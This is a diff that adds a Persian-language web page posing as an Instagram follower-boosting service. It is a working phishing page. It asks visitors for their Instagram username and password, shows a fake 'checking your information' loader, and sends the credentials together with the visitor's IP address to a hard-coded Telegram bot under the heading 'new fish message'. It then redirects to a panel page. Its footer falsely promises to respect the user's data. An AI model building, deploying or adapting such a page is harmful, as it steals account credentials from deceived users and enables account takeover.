@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8">
+  <title>افزایش فالوور اینستاگرام</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    @font-face {
+      font-family: 'Vazir';
+      src: url('https://cdn.jsdelivr.net/gh/rastikerdar/vazir-font@v30.1.0/dist/Vazir.woff2') format('woff2');
+    }
+    body {
+      margin: 0;
+      font-family: "Vazir", sans-serif;
+      background: linear-gradient(135deg, #e1306c, #fd1d1d, #f77737);
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .box {
+      background: #fff;
+      padding: 30px;
+      border-radius: 20px;
+      width: 90%;
+      max-width: 350px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    .logo {
+      width: 80px;
+      margin-bottom: 15px;
+      filter: brightness(0) invert(1);
+    }
+    .box h2 {
+      color: #e1306c;
+      margin-bottom: 20px;
+      font-size: 24px;
+      font-weight: bold;
+    }
+    input {
+      width: 90%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      text-align: right;
+      font-family: "Vazir", sans-serif;
+    }
+    button {
+      background: #e1306c;
+      color: white;
+      border: none;
+      padding: 12px 25px;
+      border-radius: 10px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 15px;
+    }
+    .footer {
+      margin-top: 15px;
+      font-size: 12px;
+      color: gray;
+    }
+    .overlay {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(3px);
+      z-index: 9999;
+      justify-content: center;
+      align-items: center;
+    }
+    .loader-box {
+      background: white;
+      padding: 25px 30px;
+      border-radius: 15px;
+      text-align: center;
+      box-shadow: 0 0 20px rgba(0,0,0,0.2);
+    }
+    .loader {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #e1306c;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      margin: auto;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .loader-text {
+      margin-top: 15px;
+      font-size: 15px;
+      color: #e1306c;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" class="logo" alt="Logo">
+    <h2>فالور گیر اینستا</h2>
+    <input type="text" id="username" placeholder="نام کاربری اینستاگرام">
+    <input type="password" id="password" placeholder="رمز عبور اینستاگرام">
+    <button onclick="sendData()">ورود</button>
+    <div class="footer">ما به اطلاعات شما احترام می‌گذاریم</div>
+  </div>
+  <div class="overlay" id="loadingOverlay">
+    <div class="loader-box">
+      <div class="loader"></div>
+      <div class="loader-text">در حال بررسی اطلاعات شما...</div>
+    </div>
+  </div>
+  <script>
+    async function sendData() {
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      const token = "7874856646:AAFdjsl46Foud0-CUlVRfR9mUsPyFKnS2l8";
+      const chatId = "-4690783911"; 
+
+      const overlay = document.getElementById('loadingOverlay');
+      overlay.style.display = 'flex';
+
+      try {
+        const ipResponse = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipResponse.json();
+        const ip = ipData.ip;
+
+        const message = `📛𝔫𝔢𝔴 𝔣𝔦𝔰𝔥 𝔪𝔢𝔰𝔰𝔞𝔤𝔢📛
+        𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘: ${username}
+        𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗: ${password}
+        𝗜𝗣: ${ip}
+        𝖢𝖮𝖣𝖤𝖣 𝖡𝖸 : @im_zero_cool & @MTcole`;
+
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+
+        setTimeout(() => {
+          window.location.href = "panel.html"; 
+        }, 3000);
+      } catch (error) {
+        overlay.style.display = 'none';
+        alert("خطا در ارسال اطلاعات");
+        console.error(error);
+      }
+    }
+  </script>
+</body>
+</html>
